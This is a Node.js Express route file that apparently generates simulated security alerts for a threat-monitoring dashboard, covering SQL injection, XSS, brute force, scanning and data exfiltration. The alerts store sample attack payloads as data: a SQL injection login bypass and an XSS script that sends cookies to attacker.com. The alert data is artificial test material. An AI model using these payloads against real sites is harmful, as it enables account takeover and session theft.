const express = require('express');
const router = express.Router();
const Alert = require('../models/Alert');
const { auth } = require('../middleware/auth');

// =====================================
// SECURITY ALERT GENERATION ROUTES
// =====================================

// 1. SQL Injection Alert
router.post('/sql-injection', auth, async (req, res) => {
    try {
        const alert = new Alert({
            type: 'SQL_INJECTION',
            severity: 'Critical',
            message: 'SQL Injection attempt detected in database query',
            ip: '192.168.1.100',
            path: '/api/users',
            payload: "admin' OR '1'='1' -- SELECT * FROM users WHERE username='",
            threatSource: {
                detectionSource: 'Security Scanner',
                sourceIP: '192.168.1.100',
                sourcePath: '/api/users/search?q=',
                targetURL: 'http://localhost:3000/api/users',
                sourceReputation: 'Malicious',
            },
            analysis: {
                attackVector: 'SQL query manipulation via user input',
                confidence: 95,
                aiAnalysis: 'Classic SQL injection attack attempting to bypass authentication',
                recommendations: [
                    'Use parameterized queries',
                    'Implement input validation',
                    'Enable WAF protection'
                ]
            }
        });

        await alert.save();
        req.app.get('socketio').emit('newAlert', alert);
        
        res.json({ success: true, message: 'SQL Injection alert created', alert });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// 2. XSS Attack Alert
router.post('/xss', auth, async (req, res) => {
    try {
        const alert = new Alert({
            type: 'XSS',
            severity: 'High',
            message: 'Cross-Site Scripting (XSS) vulnerability detected',
            ip: '10.0.0.50',
            path: '/dashboard',
            payload: '<script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script>',
            threatSource: {
                detectionSource: 'Threat Detector',
                sourceIP: '10.0.0.50',
                sourcePath: '/dashboard?name=',
                targetURL: 'http://localhost:3000/dashboard',
                sourceReputation: 'Suspicious',
            },
            analysis: {
                attackVector: 'Malicious script injection in DOM',
                confidence: 88,
                aiAnalysis: 'XSS payload attempting to steal user session cookies',
                recommendations: [
                    'Sanitize user input with DOMPurify',
                    'Implement Content Security Policy',
                    'Use HttpOnly cookies'
                ]
            }
        });

        await alert.save();
        req.app.get('socketio').emit('newAlert', alert);
        
        res.json({ success: true, message: 'XSS alert created', alert });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// 3. Brute Force Attack Alert
router.post('/brute-force', auth, async (req, res) => {
    try {
        const alert = new Alert({
            type: 'BRUTE_FORCE',
            severity: 'High',
            message: 'Brute force attack detected on authentication endpoint',
            ip: '203.0.113.50',
            path: '/api/auth/login',
            payload: 'Failed login attempts: 250 in 10 minutes from single IP',
            threatSource: {
                detectionSource: 'API Monitor',
                sourceIP: '203.0.113.50',
                sourcePath: '/api/auth/login',
                targetURL: 'http://localhost:3000/api/auth/login',
                sourceCountry: 'CN',
                sourceReputation: 'Malicious',
            },
            analysis: {
                attackVector: 'Automated credential guessing',
                confidence: 99,
                aiAnalysis: 'High-velocity login attempts matching known brute-force patterns',
                recommendations: [
                    'Implement rate limiting',
                    'Enable account lockout',
                    'Deploy CAPTCHA verification',
                    'Use 2FA authentication'
                ]
            }
        });

        await alert.save();
        req.app.get('socketio').emit('newAlert', alert);
        
        res.json({ success: true, message: 'Brute force alert created', alert });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// 4. Suspicious IP Access Alert
router.post('/suspicious-ip', auth, async (req, res) => {
    try {
        const alert = new Alert({
            type: 'SUSPICIOUS_IP',
            severity: 'Medium',
            message: 'Suspicious IP accessing admin endpoints',
            ip: '198.51.100.70',
            path: '/api/admin',
            payload: 'Multiple requests to restricted admin endpoints detected',
            threatSource: {
                detectionSource: 'Firewall',
                sourceIP: '198.51.100.70',
                sourcePath: '/api/admin/users',
                targetURL: 'http://localhost:3000/api/admin',
                sourceCountry: 'RU',
                sourceReputation: 'Suspicious',
            },
            analysis: {
                attackVector: 'Unauthorized endpoint enumeration',
                confidence: 75,
                aiAnalysis: 'IP attempting to access admin resources without proper authorization',
                recommendations: [
                    'Block IP at firewall',
                    'Enable admin IP whitelist',
                    'Monitor for privilege escalation'
                ]
            }
        });

        await alert.save();
        req.app.get('socketio').emit('newAlert', alert);
        
        res.json({ success: true, message: 'Suspicious IP alert created', alert });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// 5. Scanner Activity Alert
router.post('/scanner', auth, async (req, res) => {
    try {
        const alert = new Alert({
            type: 'SCANNER_ACTIVITY',
            severity: 'Medium',
            message: 'Automated vulnerability scanner detected',
            ip: '192.0.2.60',
            path: '/',
            payload: 'Nmap port scan detected on ports: 80, 443, 3000, 5000, 8080',
            threatSource: {
                detectionSource: 'Firewall',
                sourceIP: '192.0.2.60',
                sourcePath: '/*',
                targetURL: 'http://localhost:3000',
                sourceReputation: 'Unknown',
            },
            analysis: {
                attackVector: 'Network reconnaissance and port enumeration',
                confidence: 92,
                aiAnalysis: 'Nmap-style network scanning indicating pre-attack reconnaissance',
                recommendations: [
                    'Block scanning IPs',
                    'Implement intrusion detection',
                    'Configure firewall rules',
                    'Deploy honeypots'
                ]
            }
        });

        await alert.save();
        req.app.get('socketio').emit('newAlert', alert);
        
        res.json({ success: true, message: 'Scanner activity alert created', alert });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// 6. Data Exfiltration Alert
router.post('/data-exfil', auth, async (req, res) => {
    try {
        const alert = new Alert({
            type: 'OTHER',
            severity: 'Critical',
            message: 'Unusual data exfiltration pattern detected',
            ip: '172.16.0.100',
            path: '/api/data/export',
            payload: 'Downloaded 500MB of user data in 5 minutes to external IP',
            threatSource: {
                detectionSource: 'API Monitor',
                sourceIP: '172.16.0.100',
                sourcePath: '/api/data/export',
                targetURL: 'http://localhost:3000/api/data/export',
                sourceCountry: 'Unknown',
                sourceReputation: 'Malicious',
            },
            analysis: {
                attackVector: 'Bulk data extraction via API',
                confidence: 97,
                aiAnalysis: 'Massive data download to suspicious IP - likely data breach attempt',
                recommendations: [
                    'Block data export immediately',
                    'Review API access logs',
                    'Implement data loss prevention',
                    'Alert incident response team'
                ]
            }
        });

        await alert.save();
        req.app.get('socketio').emit('newAlert', alert);
        
        res.json({ success: true, message: 'Data exfiltration alert created', alert });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// 7. Generate Random Alert
router.post('/random', auth, async (req, res) => {
    try {
        const threats = [
            {
                type: 'SQL_INJECTION',
                severity: 'Critical',
                message: 'SQL injection detected',
                sourceIP: '192.168.' + Math.floor(Math.random() * 256) + '.' + Math.floor(Math.random() * 256),
            },
            {
                type: 'XSS',
                severity: 'High',
                message: 'XSS vulnerability detected',
                sourceIP: '10.0.0.' + Math.floor(Math.random() * 256),
            },
            {
                type: 'BRUTE_FORCE',
                severity: 'High',
                message: 'Brute force attack detected',
                sourceIP: '203.0.113.' + Math.floor(Math.random() * 256),
            },
            {
                type: 'SUSPICIOUS_IP',
                severity: 'Medium',
                message: 'Suspicious IP access detected',
                sourceIP: '198.51.100.' + Math.floor(Math.random() * 256),
            },
            {
                type: 'SCANNER_ACTIVITY',
                severity: 'Medium',
                message: 'Scanner activity detected',
                sourceIP: '192.0.2.' + Math.floor(Math.random() * 256),
            }
        ];

        const threat = threats[Math.floor(Math.random() * threats.length)];

        const alert = new Alert({
            type: threat.type,
            severity: threat.severity,
            message: threat.message,
            ip: threat.sourceIP,
            path: '/api/endpoint',
            payload: 'Random threat payload for testing',
            threatSource: {
                detectionSource: ['Security Scanner', 'Threat Detector', 'Firewall', 'API Monitor'][Math.floor(Math.random() * 4)],
                sourceIP: threat.sourceIP,
                sourcePath: '/api/' + Math.random().toString(36).substring(7),
                targetURL: 'http://localhost:3000/api',
                sourceReputation: ['Malicious', 'Suspicious', 'Unknown'][Math.floor(Math.random() * 3)],
            },
            analysis: {
                attackVector: 'Automated threat detection',
                confidence: 60 + Math.floor(Math.random() * 40),
                aiAnalysis: 'Detected potential security threat',
                recommendations: ['Review logs', 'Block attacker IP', 'Enable protections']
            }
        });

        await alert.save();
        req.app.get('socketio').emit('newAlert', alert);
        
        res.json({ success: true, message: 'Random alert created', alert });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// 8. Clear All Alerts (for testing)
router.delete('/clear-all', auth, async (req, res) => {
    try {
        const result = await Alert.deleteMany({});
        res.json({ success: true, message: `Deleted ${result.deletedCount} alerts` });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;
